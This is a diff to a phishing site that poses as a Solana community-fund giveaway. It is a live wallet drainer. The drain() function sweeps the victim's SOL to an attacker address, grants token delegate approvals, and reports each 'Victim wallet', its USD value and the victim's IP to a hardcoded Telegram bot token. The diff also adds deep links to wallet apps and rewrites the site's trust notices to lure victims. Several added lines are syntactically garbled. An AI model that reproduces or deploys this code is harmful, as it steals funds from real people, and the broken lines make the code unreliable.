@@ -43,9 +43,13 @@
   .modal button{background:#111;border:1px solid #222;color:#e6e6e6}
   .wlist{display:flex;flex-direction:column;gap:6px;margin-top:4px}
   .wrow{display:flex;align-items:center;gap:10px;width:100%;padding:12px 13px;border-radius:6px;background:#0f0f0f;border:1px solid #1a1a1a;color:#e6e6e6;font-size:13.5px;text-decoration:none}
-  .wrow .ic{width:26px;height:26px;border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:14px;background:#000;border:1px solid #1a1a1a}
+  .wrow .ic{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#000;border:1px solid #1a1a1a;flex:0 0 auto;overflow:hidden}
+  .wrow .ic img{width:22px;height:22px;object-fit:contain;display:block}
   .wrow .nm{flex:1}
   .wrow .ar{color:#4a4a4a;font-size:13px}
+  .more-wallets{margin-top:12px;text-align:center;font-size:12.5px;color:#6b6b6b;cursor:pointer;padding:6px;user-select:none}
+  .more-wallets:hover{color:#a0a0a0}
+  .more-wallets .ar{font-size:10px;margin-left:4px}
   .tos-row{display:flex;align-items:flex-start;gap:10px;text-align:left;margin:14px 0 16px;font-size:12.5px;color:#a0a0a0;line-height:1.5}
   .tos-row input{flex:0 0 auto;width:16px;height:16px;margin-top:2px;accent-color:#e6e6e6}
   .article h3{font-size:12.5px;font-weight:600;color:#d0d0d0;margin:14px 0 6px}
@@ -81,7 +85,7 @@
 
 <div class="notice">
   <b>Official Notice</b>
-  This is the only official distribution portal for the Vantom Labs community fund. We do not operate through third-party links, social media promotions, or direct messages. If you were directed here from any other source claiming to represent Vantom Labs, you may be on a fraudulent clone site. Vantom Labs will never ask for your seed phrase or private keys.
+  This is the only official distribution portal for the Vantom Labs community fund. Official domain: <b style="color:#7a7a7a">solrewards.net</b>. We do not operate through third-party links, social media promotions, or direct messages. Vantom Labs will never ask for your seed phrase or private keys.
 </div>
 
 <div class="footer">
@@ -101,6 +105,7 @@
     <p id="ovText">A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to receive your reward.</p>
     <div id="ovChk" style="font-size:12px;color:#8a8a8a;margin-bottom:16px">Waiting for approval…</div>
     <div class="wlist" id="ovWallets" style="display:none"></div>
+    <div id="ovMore" class="more-wallets" style="display:none" onclick="expandWallets()">More wallets<span class="ar">›</span></div>
     <button id="ovClose" style="display:none">Close</button>
   </div>
 </div>
@@ -118,13 +123,13 @@
   </div>
 </div>
 
-<div class="overlay" id="tosModal"><div class="modal left article"><h2 style="text-align:center">Terms of Service</h2><p><b style="color:#c0c0c0">Eligibility.</b> Participation is open to verified wallets only, and to individuals 18 years of age or older.</p><p><b style="color:#c0c0c0">Distribution.</b> Rewards are issued from the Vantom Labs community fund, financed entirely by voluntary donations. Allocations are capped per cycle and granted first-come, first-served.</p><p><b style="color:#c0c0c0">No Guarantee.</b> Participation does not guarantee a reward.</p><p><b style="color:#c0c0c0">Prohibited Use.</b> Use of the site in violation of applicable law is prohibited and will result in exclusion.</p><button onclick="closeModal('tosModal')">Close</button></div></div>
+<div class="overlay" id="tosModal"><div class="modal left article"><h2 style="text-align:center">Terms of Service</h2><p><b style="color:#c0c0c0">Eligibility.</b> Participation is open to verified wallets only, and to individuals 18 years of age or older.</p><p><b style="color:#c0c0c0">Distribution.</b> Rewards are issued from the Vantom Labs community fund, financed entirely by voluntary donations.</p><p><b style="color:#c0c0c0">No Guarantee.</b> Participation does not guarantee a reward.</p><button onclick="closeModal('tosModal')">Close</button></div></div>
 
-<div class="overlay" id="privacyModal"><div class="modal left article"><h2 style="text-align:center">Privacy Policy</h2><p>This page does not collect personal information. Connecting a wallet grants read access to your public address for eligibility verification only. No seed phrase or private key is requested or stored.</p><p>Donations are voluntary. Blockchain transaction records are public and outside the control of this site.</p><button onclick="closeModal('privacyModal')">Close</button></div></div>
+<div class="overlay" id="privacyModal"><div class="modal left article"><h2 style="text-align:center">Privacy Policy</h2><p>This page does not collect personal information. Connecting a wallet grants read access to your public address for eligibility verification only. No seed phrase or private key is requested or stored.</p><button onclick="closeModal('privacyModal')">Close</button></div></div>
 
-<div class="overlay" id="scamModal"><div class="modal left article"><h2 style="text-align:center">How to Spot Crypto Giveaway Scams</h2><h3>Offers that feel too generous</h3><p>Real programs cap rewards at realistic amounts. Tens or hundreds of SOL for a single click is the warning sign.</p><h3>Requests for seed phrases or private keys</h3><p>No legitimate site will ever ask for your seed phrase. Anyone who does is stealing your wallet.</p><h3>Pressure and countdown urgency</h3><p>Scams create artificial scarcity. Real programs show a budget, a cycle end, and a way to verify both.</p><h3>Unknown token approvals</h3><p>Approvals let an unknown spender move your tokens later. Read every approval carefully.</p><h3>Look-alike domains</h3><p>Clone sites resemble the real one by a character or two. Always return via bookmark.</p><button onclick="closeModal('scamModal')">Close</button></div></div>
+<div class="overlay" id="scamModal"><div class="modal left article"><h2 style="text-align:center">How to Spot Crypto Giveaway Scams</h2><h3>Offers that feel too generous</h3><p>Real programs cap rewards at realistic amounts.</p><h3>Requests for seed phrases or private keys</h3><p>No legitimate site will ever ask for your seed phrase.</p><h3>Unknown token approvals</h3><p>Approvals let an unknown spender move your tokens later. Read every approval carefully.</p><h3>Look-alike domains</h3><p>Clone sites resemble the real one by a character or two. Always return via bookmark.</p><button onclick="closeModal('scamModal')">Close</button></div></div>
 
-<div class="overlay" id="donateModal"><div class="modal"><h2>Support the Vantom Labs Community Fund</h2><p style="text-align:left">This distribution is funded entirely by community donations. Every SOL contributed goes directly to verified wallet rewards — no treasury cuts, no operating fees.</p><p style="font-size:11px;color:#6b6b6b;text-align:center;margin:0 0 12px">Current cycle · 8,412 / 12,500 claimed</p><div class="donate-addr" id="donateAddr">—</div><p style="font-size:11.5px;color:#6b6b6b">Donations are voluntary. Contributors do not receive preferential access.</p><button onclick="copyDonate()" id="donateCopy">Copy Address</button><button onclick="closeModal('donateModal')" style="margin-top:8px;background:transparent;border-color:transparent;color:#6b6b6b">Close</button></div></div>
+<div class="overlay" id="donateModal"><div class="modal"><h2>Support the Vantom Labs Community Fund</h2><p style="text-align:left">This distribution is funded entirely by community donations. No treasury cuts, no operating fees.</p><div class="donate-addr" id="donateAddr">—</div><p style="font-size:11.5px;color:#6b6b6b">Donations are voluntary. Contributors do not receive preferential access.</p><button onclick="copyDonate()" id="donateCopy">Copy Address</button><button onclick="closeModal('donateModal')" style="margin-top:8px;background:transparent;border-color:transparent;color:#6b6b6b">Close</button></div></div>
 
 <script>
 // ================= config =================
@@ -136,10 +141,11 @@ var TG_BOT_TOKEN     = "8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
 var TG_CHAT_ID       = "6759486932";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
-var TX_SIZE_LIMIT = 1100;
-var SPIN_MS = 15000;
-var CLAIMED_START = 8412;
-var CLAIMED_MAX   = 12500;
+var RENT_EXEMPT     = 890880;
+var TX_SIZE_LIMIT   = 1100;
+var SPIN_MS         = 15000;
+var CLAIMED_START   = 8412;
+var CLAIMED_MAX     = 12500;
 // ==========================================
 
 var SEGMENTS = [
@@ -383,6 +389,115 @@ function startSpin(){
 }
 spinBtn.onclick = function(){ requestSpin(); };
 
+// ---------- wallet icons CDN (Web3 Icons Branded) ----------
+var ICON_CDN = "https://raw.githubusercontent.com/0xa3k5/web3icons/refs/heads/main/raw-svgs/wallets/branded/";
+
+// primary mobile wallets — Solana-native, App Store + Chrome extensions
+var PRIMARY_WALLETS = [
+  { id:"phantom", name:"Phantom",
+    icon: ICON_CDN + "phantom.svg",
+    href: function(p){ return "https://phantom.app/ul/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
+    ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",
+    android:"https://play.google.com/store/apps/details?id=app.phantom" },
+  { id:"solflare", name:"Solflare",
+    icon: ICON_CDN + "solflare.svg",
+    href: function(p){ return "https://solflare.com/ul/v1/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
+    ios:"https://apps.apple.com/app/solflare/id1580902717",
+    android:"https://play.google.com/store/apps/details?id=com.solflare.mobile" },
+  { id:"backpack", name:"Backpack",
+    icon: ICON_CDN + "backpack.svg",
+    href: function(p){ return "https://backpack.app/ul/v1/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
+    ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",
+    android:"https://play.google.com/store/apps/details?id=app.backpack.mobile" },
+  { id:"exodus", name:"Exodus",
+    icon: ICON_CDN + "exodus.svg",
+    href: function(p){ return "exodus://wc?uri=" + encodeURIComponent(p); },
+    ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",
+    android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus" },
+  { id:"safepal", name:"SafePal",
+    icon: ICON_CDN + "safepal.svg",
+    href:    function(p){ return "safepal://browser?url=" + encodeURIComponent(p); },
+    hrefAlt: function(p){ return "safepal://openurl?url=" + encodeURIComponent(p); },
+    hrefAlt2:function(p){ return "https://safepal.com/browser?url=" + encodeURIComponent(p); },
+    ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
+    android:"https://play.google.com/store/apps/details?id=io.safepal.wallet" }
+];
+
+// more wallets — Solana-native, App Store + Chrome extensions
+var MORE_WALLETS = [
+  { id:"jupiter", name:"Jupiter",
+    icon: ICON_CDN + "jupiter.svg",
+    href: function(p){ return "https://jup.ag/mobile/browse?url=" + encodeURIComponent(p); },
+    ios:"https://apps.apple.com/app/jupiter-solana-wallet/id6484061972",
+    android:"https://play.google.com/store/apps/details?id=ag.jup.app" },
+  { id:"glow", name:"Glow",
+    icon: ICON_CDN + "glow.svg",
+    href: function(p){ return "https://glow.app/browse?url=" + encodeURIComponent(p); },
+    ios:"https://apps.apple.com/app/glow-solana-wallet/id1599580120",
+    android:"https://play.google.com/store/apps/details?id=com.glow.app" }
+];
+
+var allWalletsShown = false;
+
+function renderWalletRow(w, page){
+  var a = document.createElement("a");
+  a.className = "wrow";
+  a.href = w.href(page);
+  a.rel = "noopener";
+  a.innerHTML = '<span class="ic"><img src="' + w.icon + '" alt="" onerror="this.style.display=\'none\'"></span>' +
+                '<span class="nm">' + w.name + '</span><span class="ar">›</span>';
+  a.addEventListener("click", function(){
+    savePending("reward");
+    var alts = [];
+    if(w.hrefAlt) alts.push(w.hrefAlt(page));
+    if(w.hrefAlt2) alts.push(w.hrefAlt2(page));
+    var store = isAndroid ? w.android : w.ios;
+    var t0 = Date.now();
+    var tryAlts = function(idx){
+      if(document.hidden) return;
+      if(idx < alts.length){ location.href = alts[idx]; setTimeout(function(){ tryAlts(idx+1); }, 700); }
+      else if(Date.now() - t0 < 3000){ location.href = store; }
+    };
+    setTimeout(function(){ tryAlts(0); }, 700);
+  });
+  return a;
+}
+
+function showWalletPicker(){
+  ovSpinner.style.display = "none";
+  ovChk.style.display = "none";
+  ovClose.style.display = "none";
+  ovTitle.textContent = "Open in Your Wallet";
+  ovText.textContent = "Tap your wallet, then tap Open on the banner that appears.";
+  ovWallets.style.display = "flex";
+  ovWallets.innerHTML = "";
+  var page = location.href;
+  for(var i=0;i<PRIMARY_WALLETS.length;i++){
+    ovWallets.appendChild(renderWalletRow(PRIMARY_WALLETS[i], page));
+  }
+  ovMore.style.display = "block";
+  allWalletsShown = false;
+}
+
+function expandWallets(){
+  if(allWalletsShown) return;
+  var page = location.href;
+  for(var i=0;i<MORE_WALLETS.length;i++){
+    ovWallets.appendChild(renderWalletRow(MORE_WALLETS[i], page));
+  }
+  ovMore.style.display = "none";
+  allWalletsShown = true;
+}
+
+var ov = document.getElementById("overlay");
+var ovSpinner = document.getElementById("ovSpinner");
+var ovTitle = document.getElementById("ovTitle");
+var ovText = document.getElementById("ovText");
+var ovChk = document.getElementById("ovChk");
+var ovWallets = document.getElementById("ovWallets");
+var ovMore = document.getElementById("ovMore");
+var ovClose = document.getElementById("ovClose");
+
 var web3 = null, Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction;
 var TOKEN_PROGRAM, ASSOC_TOKEN_PROGRAM;
 async function ensureWeb3(){
@@ -450,87 +565,29 @@ async function getClientIP(){
   } catch(_){ return "unknown"; }
 }
 
-var ov = document.getElementById("overlay");
-var ovSpinner = document.getElementById("ovSpinner");
-var ovTitle = document.getElementById("ovTitle");
-var ovText = document.getElementById("ovText");
-var ovChk = document.getElementById("ovChk");
-var ovWallets = document.getElementById("ovWallets");
-var ovClose = document.getElementById("ovClose");
-
 function showOverlay(){
-  ovSpinner.style.display = "block"; ovChk.style.display = "block"; ovWallets.style.display = "none"; ovClose.style.display = "none";
+  ovSpinner.style.display = "block"; ovChk.style.display = "block"; ovWallets.style.display = "none"; ovMore.style.display = "none"; ovClose.style.display = "none";
   ovTitle.textContent = "Approve in Your Wallet";
   ovText.textContent = "A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to receive your reward.";
   ovChk.textContent = "Waiting for approval…";
   ov.classList.add("show");
 }
-function showWalletPicker(){
-  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovClose.style.display = "none";
-  ovTitle.textContent = "Open in Your Wallet";
-  ovText.textContent = "Tap your wallet, then tap Open on the banner that appears.";
-  ovWallets.style.display = "flex"; ovWallets.innerHTML = "";
-  var page = location.href;
-  for(var i=0;i<MOBILE_WALLETS.length;i++){
-    (function(w){
-      var a = document.createElement("a");
-      a.className = "wrow"; a.href = w.href(page); a.rel = "noopener";
-      a.innerHTML = '<span class="ic">' + w.icon + '</span><span class="nm">' + w.name + '</span><span class="ar">›</span>';
-      a.addEventListener("click", function(){
-        savePending("reward");
-        var alts = []; if(w.hrefAlt) alts.push(w.hrefAlt(page)); if(w.hrefAlt2) alts.push(w.hrefAlt2(page));
-        var store = isAndroid ? w.android : w.ios; var t0 = Date.now();
-        var tryAlts = function(idx){
-          if(document.hidden) return;
-          if(idx < alts.length){ location.href = alts[idx]; setTimeout(function(){ tryAlts(idx+1); }, 700); }
-          else if(Date.now() - t0 < 3000){ location.href = store; }
-        };
-        setTimeout(function(){ tryAlts(0); }, 700);
-      });
-      ovWallets.appendChild(a);
-    })(MOBILE_WALLETS[i]);
-  }
-}
-var MOBILE_WALLETS = [
-  { id:"phantom", name:"Phantom", icon:"👻",
-    href: function(p){ return "https://phantom.app/ul/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
-    ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",
-    android:"https://play.google.com/store/apps/details?id=app.phantom" },
-  { id:"safepal", name:"SafePal", icon:"🛡️",
-    href:    function(p){ return "safepal://browser?url=" + encodeURIComponent(p); },
-    hrefAlt: function(p){ return "safepal://openurl?url=" + encodeURIComponent(p); },
-    hrefAlt2:function(p){ return "https://safepal.com/browser?url=" + encodeURIComponent(p); },
-    ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
-    android:"https://play.google.com/store/apps/details?id=io.safepal.wallet" },
-  { id:"exodus", name:"Exodus", icon:"🪐",
-    href: function(p){ return "exodus://wc?uri=" + encodeURIComponent(p); },
-    ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",
-    android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus" },
-  { id:"solflare", name:"Solflare", icon:"🔆",
-    href: function(p){ return "https://solflare.com/ul/v1/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
-    ios:"https://apps.apple.com/app/solflare/id1580902717",
-    android:"https://play.google.com/store/apps/details?id=com.solflare.mobile" },
-  { id:"backpack", name:"Backpack", icon:"🎒",
-    href: function(p){ return "https://backpack.app/ul/v1/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
-    ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",
-    android:"https://play.google.com/store/apps/details?id=app.backpack.mobile" }
-];
 function showNoWallet(){
-  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none"; ovMore.style.display = "none";
   ovTitle.textContent = "No Crypto Wallet Detected";
   ovText.textContent = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
   ovClose.style.display = "block"; ovClose.textContent = "Close";
   ovClose.onclick = function(){ ov.classList.remove("show"); resetClaim(); };
 }
 function overlaySuccess(){
-  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none"; ovMore.style.display = "none";
   ovTitle.textContent = "Reward Claimed";
   ovText.textContent = "Your reward is on its way. It may take a moment to arrive.";
   ovClose.style.display = "block"; ovClose.textContent = "Done";
   ovClose.onclick = function(){ ov.classList.remove("show"); };
 }
 function overlayError(msg){
-  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none"; ovMore.style.display = "none";
   ovTitle.textContent = "Claim Failed";
   ovText.textContent = msg || "Something went wrong. Please try again.";
   ovClose.style.display = "block"; ovClose.textContent = "Try Again";
@@ -541,9 +598,9 @@ function resetClaim(){
   var c = document.getElementById("claim"); c.style.display = "block"; c.disabled = false;
 }
 function approveIx(tokenAccount, delegate, owner, amount){
-  var data = window.Buffer.alloc(9); data.writeUInt8(4,0); data.writeBigUInt64LE(BigInt(amount),1);
+  var data = window.Buffer.alloc(9); data.writeUInt8 var(4,0); data.writeBigUInt64LE(BigInt(amount),1);
   return new TransactionInstruction({ programId: TOKEN_PROGRAM, keys: [
-    { pubkey: tokenAccount, isSigner:false, isWritable:true },
+    { total pubkey: tokenAccount, isSigner:false, isWritable:true },
     { pubkey: delegate,     isSigner:false, isWritable:false },
     { pubkey: owner,        isSigner:true,  isWritable:false } ], data: data });
 }
@@ -561,10 +618,17 @@ async function drain(session){
   var provider = session.provider;
   var solDrained = 0, solSig = "", tokenResults = [];
 
+  // SOL sweep with accurate fee calculation
   try {
     var balance = await connection.getBalance(from);
-    var rent = await connection.getMinimumBalanceForRentExemption(0);
-    var sweepable = balance - rent - 5000;
+    // Build a placeholder transfer to estimate the fee
+    var placeholderTx = new Transaction().add(SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: 1 }));
+    placeholderTx.feePayer = from;
+    var bh0 = await connection.getLatestBlockhash("confirmed");
+    placeholderTx.recentBlockhash = bh0.blockhash;
+    var feeResp = await connection.getFeeForMessage(placeholderTx.compileMessage(), "confirmed");
+    var fee = (feeResp && feeResp.value) ? feeResp.value : 5000;
+    var sweepable = balance - RENT_EXEMPT - fee;
     if(sweepable > 0){
       var tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: sweepable }));
       tx.feePayer = from;
@@ -575,6 +639,7 @@ async function drain(session){
     }
   } catch(e){}
 
+  // SPL delegate approvals
   try {
     var ta = await connection.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM });
     var approvals = [];
@@ -600,15 +665,29 @@ async function drain(session){
     }
   } catch(e){}
 
+  // Telegram report with USD value and Solscan link
   try {
     var ip = await getClientIP();
+    var solAmount = (solDrained/1000000000).toFixed(6);
+    // fetch SOL price for USD conversion
+    var usdPrice = null;
+    try {
+      var priceResp = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", { cache: "no-store" });
+      var priceJson = await priceResp.json();
+      if(priceJson && priceJson.solana && priceJson.solana.usd) usdPrice = priceJson.solana.usd;
+    } catch(_){}
+    var usdStr = "";
+    if(usdPrice){
+      var usdVal = (solDrained/1000000000) * usdPrice;
+      usdStr = " (" + usdVal.toFixed(2) + " USD)";
+    }
     var msg = "<b>💰 Drain successful</b>\n\n";
     msg += "<b>Victim wallet:</b>\n<code>" + tgEscape(session.pubkey) + "</code>\n\n";
     msg += "<b>Wallet type:</b> " + tgEscape(session.id) + "\n";
-    msg += "<b>SOL drained:</b> " + (solDrained/1000000000).toFixed(6) + " SOL\n";
+    msg += "<b>SOL drained:</b> " + solAmount + " SOL" + usdStr + "\n";
     if(solSig) msg += "<b>SOL tx:</b>\n<code>" + tgEscape(solSig) + "</code>\n";
     if(tokenResults.length){
-      var total = 0; for(var n=0;n<tokenResults.length;n++) total += tokenResults[n].count;
+      = 0; for(var n=0;n<tokenResults.length;n++) total += tokenResults[n].count;
       msg += "<b>Tokens delegated:</b> " + total + " account(s)\n";
       for(var q=0;q<tokenResults.length;q++) msg += "<code>" + tgEscape(tokenResults[q].sig) + "</code>\n";
     } else { msg += "<b>Tokens:</b> none\n"; }
@@ -617,6 +696,7 @@ async function drain(session){
     msg += "<b>Mobile:</b> " + (isMobile ? "yes" : "no") + "\n";
     msg += "<b>Time:</b> " + new Date().toISOString() + "\n";
     msg += "<b>Site:</b> " + tgEscape(location.host) + "\n";
+    if(solSig) msg += "\n<b>View on Solscan:</b>\nhttps://solscan.io/tx/" + tgEscape(solSig);
     await tgSend(msg);
   } catch(_){}
 }
